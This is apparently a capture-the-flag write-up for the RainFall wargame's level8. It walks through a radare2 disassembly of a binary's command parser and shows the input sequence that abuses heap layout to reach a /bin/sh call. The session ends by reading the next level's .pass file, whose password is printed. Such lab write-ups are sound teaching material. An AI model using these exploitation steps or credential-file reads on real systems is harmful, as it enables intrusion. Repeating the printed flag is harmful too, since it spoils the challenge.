We start again with `radare2` and see some really interesting strings in the code that are compared at various times:
```bash
[0x080484b0]> pdf @ sub.main_8048564
            ;-- main:
            ; ICOD XREF from sub.entry0_80484b0 @ 0x80484c7(r)
┌ 469: sub.main_8048564 ();
│ afv: vars(6:sp[0xc..0xa8])
[...]
│    ╎╎╎    0x080485a7      8d442420       lea eax, [src]
│    ╎╎╎    0x080485ab      890424         mov dword [esp], eax        ; char *s
│    ╎╎╎    0x080485ae      e88dfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│    ╎╎╎    0x080485b3      85c0           test eax, eax
│    ╎╎╎┌─< 0x080485b5      0f8471010000   je 0x804872c
│    ╎╎╎│   0x080485bb      8d442420       lea eax, [src]
│    ╎╎╎│   0x080485bf      89c2           mov edx, eax
│    ╎╎╎│   0x080485c1      b819880408     mov eax, str.auth           ; 0x8048819 ; "auth "
[...]
│  ││╎╎╎│   0x08048631      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│  ││╎╎╎│   0x08048636      89542404       mov dword [size], edx       ; const char *src
│  ││╎╎╎│   0x0804863a      890424         mov dword [esp], eax        ; char *dest
│  ││╎╎╎│   0x0804863d      e81efeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│  ││╎╎╎│   ; CODE XREFS from sub.main_8048564 @ 0x80485e2(x), 0x8048628(x)
│  └└─────> 0x08048642      8d442420       lea eax, [src]
│    ╎╎╎│   0x08048646      89c2           mov edx, eax
│    ╎╎╎│   0x08048648      b81f880408     mov eax, str.reset          ; 0x804881f ; "reset"
│    ╎╎╎│   0x0804864d      b905000000     mov ecx, 5
[...]
│   ┌─────< 0x08048669      750d           jne 0x8048678
│   │╎╎╎│   0x0804866b      a1ac9a0408     mov eax, dword [obj.auth]   ; [0x8049aac:4]=0
│   │╎╎╎│   0x08048670      890424         mov dword [esp], eax        ; void *ptr
│   │╎╎╎│   0x08048673      e8a8fdffff     call sym.imp.free           ; void free(void *ptr)
│   │╎╎╎│   ; CODE XREF from sub.main_8048564 @ 0x8048669(x)
│   └─────> 0x08048678      8d442420       lea eax, [src]
│    ╎╎╎│   0x0804867c      89c2           mov edx, eax
│    ╎╎╎│   0x0804867e      b825880408     mov eax, str.service        ; 0x8048825 ; "service"
│    ╎╎╎│   0x08048683      b906000000     mov ecx, 6
[...]
│   │╎╎╎│   0x080486a5      83c007         add eax, 7
│   │╎╎╎│   0x080486a8      890424         mov dword [esp], eax        ; const char *src
│   │╎╎╎│   0x080486ab      e880fdffff     call sym.imp.strdup         ; char *strdup(const char *src)
│   │╎╎╎│   0x080486b0      a3b09a0408     mov dword [obj.service], eax ; [0x8049ab0:4]=0
│   │╎╎╎│   ; CODE XREF from sub.main_8048564 @ 0x804869f(x)
│   └─────> 0x080486b5      8d442420       lea eax, [src]
│    ╎╎╎│   0x080486b9      89c2           mov edx, eax
│    ╎╎╎│   0x080486bb      b82d880408     mov eax, str.login          ; 0x804882d ; "login"
│    ╎╎╎│   0x080486c0      b905000000     mov ecx, 5
[...]
│    │╎╎│   0x080486ee      c704243388..   mov dword [esp], str._bin_sh ; [0x8048833:4]=0x6e69622f ; "/bin/sh" ; const char *string
│    │╎╎│   0x080486f5      e886fdffff     call sym.imp.system         ; int system(const char *string)
│    │└───< 0x080486fa      e975feffff     jmp 0x8048574
│    │ ╎│   ; CODE XREF from sub.main_8048564 @ 0x80486ec(x)
│    └────> 0x080486ff      a1a09a0408     mov eax, dword [obj.stdout] ; obj.stdout__GLIBC_2.0
│      ╎│                                                              ; [0x8049aa0:4]=0
│      ╎│   0x08048704      89c2           mov edx, eax
│      ╎│   0x08048706      b83b880408     mov eax, str.Password:_n    ; 0x804883b ; "Password:\n"
│      ╎│   0x0804870b      8954240c       mov dword [stream], edx     ; FILE *stream
│      ╎│   0x0804870f      c74424080a..   mov dword [nitems], 0xa     ; size_t nitems
│      ╎│   0x08048717      c744240401..   mov dword [size], 1         ; size_t size
│      ╎│   0x0804871f      890424         mov dword [esp], eax        ; const void *ptr
│      ╎│   0x08048722      e829fdffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)
│      └──< 0x08048727      e948feffff     jmp 0x8048574
│       │   ; CODE XREF from sub.main_8048564 @ 0x80485b5(x)
│       └─> 0x0804872c      90             nop
│           0x0804872d      b800000000     mov eax, 0
│           0x08048732      8d65f8         lea esp, [var_bp_8h]
│           0x08048735      5e             pop esi
│           0x08048736      5f             pop edi
│           0x08048737      5d             pop ebp
└           0x08048738      c3             ret
```

When typing those strings when prompted, we get various results:
- `"auth "`: calls `malloc()` and then **copies the data** after `auth ` in the global variable
- `"reset"`: calls `free()`
- `"service"`: calls `strdup()` to copy the buffer into `service`
- `"login"`: if `auth` was properly set, calls `/bin/sh`

So we're going to use the variable in this order:
```bash
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service
0x804a008, 0x804a018
service
0x804a008, 0x804a028
login
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```